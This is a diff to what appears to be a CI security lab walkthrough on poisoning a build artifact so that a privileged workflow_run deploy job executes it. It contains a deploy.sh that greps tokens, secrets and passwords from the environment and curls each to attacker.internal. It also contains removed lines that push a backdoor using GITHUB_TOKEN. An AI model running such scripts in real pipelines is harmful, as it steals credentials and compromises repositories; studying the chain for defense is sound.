@@ -14,70 +14,56 @@
 
 ## Artifact-Based Privilege Escalation
 
-### Step 1: Create an attack branch
+### Step 1: Review the vulnerable execution boundary
 
 ```bash
 cd /repos/wl-webapp
-git checkout -b feature/ui-improvements
+cat .gitea/workflows/ci.yml
+cat .gitea/workflows/deploy.yml
 ```
 
-### Step 2: Poison the build output
+The vulnerable deploy workflow downloads `webapp.tar.gz`, extracts it, and runs `bash dist/deploy.sh`. Because `workflow_run` is not supported in Gitea, you will construct the malicious artifact manually instead of triggering the full cross-workflow chain.
 
-The deploy workflow runs `bash dist/deploy.sh`. Modify the build to produce a malicious `deploy.sh`:
+### Step 2: Construct the malicious artifact a PR build would upload
+
+The vulnerable deploy workflow runs `bash dist/deploy.sh`. Build the artifact it would later execute:
 
 ```bash
-cat > build.js << 'EOF'
-const fs = require('fs');
+mkdir -p dist
+cp app.py dist/
 
-console.log("Building application...");
-fs.mkdirSync('dist', { recursive: true });
-fs.copyFileSync('src/index.html', 'dist/index.html');
-
-const payload = `#!/bin/bash
+cat > dist/deploy.sh << 'EOF'
+#!/bin/bash
 echo "Deploying preview to staging..."
 
-# Exfiltrate all secrets from the workflow_run context
+# If a privileged workflow executes this artifact, every matching secret in
+# that environment becomes available here.
 env | grep -E '(TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL)' | while read line; do
   curl -sf "http://attacker.internal/collect" -d "secret=$line" || true
 done
 
-# Push backdoor using the write GITHUB_TOKEN
-git clone https://x-access-token:\${GITHUB_TOKEN}@github.com/\${GITHUB_REPOSITORY}.git /tmp/repo
-cd /tmp/repo
-echo "backdoor" >> README.md
-git add -A
-git commit -m "docs: update README"
-git push origin main
-
 echo "Preview deployed successfully."
-`;
-
-fs.writeFileSync('dist/deploy.sh', payload, { mode: 0o755 });
-console.log("Build complete.");
 EOF
+chmod +x dist/deploy.sh
+tar czf webapp.tar.gz dist/
 ```
 
-### Step 3: Submit the PR
+### Step 3: Inspect the artifact contents
 
 ```bash
-git add -A
-git commit -m "Improve UI components"
-git push origin feature/ui-improvements
-
-curl -sf -X POST "http://gitea:3000/api/v1/repos/developer/wl-webapp/pulls" \
-  -H "Content-Type: application/json" \
-  -u "attacker:password" \
-  -d '{"title":"Improve UI components","base":"main","head":"feature/ui-improvements"}'
+tar tzf webapp.tar.gz
+tar xzf webapp.tar.gz
+sed -n '1,120p' dist/deploy.sh
 ```
 
-**Checkpoint:** You should now have a PR whose build output contains a malicious `deploy.sh`, and understand how `workflow_run` will execute it with write permissions and full secrets.
+**Checkpoint:** You should now have a build artifact containing a malicious `dist/deploy.sh`, and you can see exactly what the vulnerable deploy workflow would execute on a platform that supports `workflow_run`.
 
-### Step 4: The attack chain executes
+### Step 4: Map the GitHub Actions attack chain
 
-1. PR triggers `pr-build.yml` which runs `npm run build` using the modified `build.js`
-2. Build produces `dist/deploy.sh` with the payload
-3. `workflow_run` triggers `deploy-preview.yml` on the default branch
-4. Deploy workflow downloads the artifact and runs `bash dist/deploy.sh`
+1. An untrusted PR build uploads `webapp.tar.gz`
+2. The artifact contains `dist/deploy.sh` with attacker-controlled commands
+3. A `workflow_run` deploy job on the default branch downloads the artifact
+4. The deploy workflow runs `bash dist/deploy.sh`
 5. Script executes with **write GITHUB_TOKEN** and **all repository secrets**
 
 ### Step 5: Why existing defenses fail
